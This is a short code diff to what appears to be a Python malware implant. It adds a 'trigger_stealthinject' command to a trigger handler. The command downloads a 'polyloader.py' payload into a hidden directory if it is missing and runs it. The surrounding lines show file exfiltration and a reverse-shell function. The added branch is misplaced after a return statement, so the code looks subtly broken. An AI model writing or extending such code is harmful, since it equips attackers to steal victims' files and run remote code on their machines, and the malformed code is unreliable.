@@ -132,6 +132,14 @@ def handle_trigger(cmd):
                     targets.append(os.path.join(root, file))
         return exfiltrate_data(targets)
 
+        elif cmd == "trigger_stealthinject":
+        print("[*] Running memory-only polyloader...")
+        path = os.path.join(HIDDEN_DIR, "polyloader.py")
+        if not os.path.exists(path):
+            if not fetch_payload("polyloader.py"):
+                return "[!] Failed to fetch polyloader.py"
+        return subprocess.getoutput(f"python3 {path}")
+
     return None
 
 def reverse_shell():
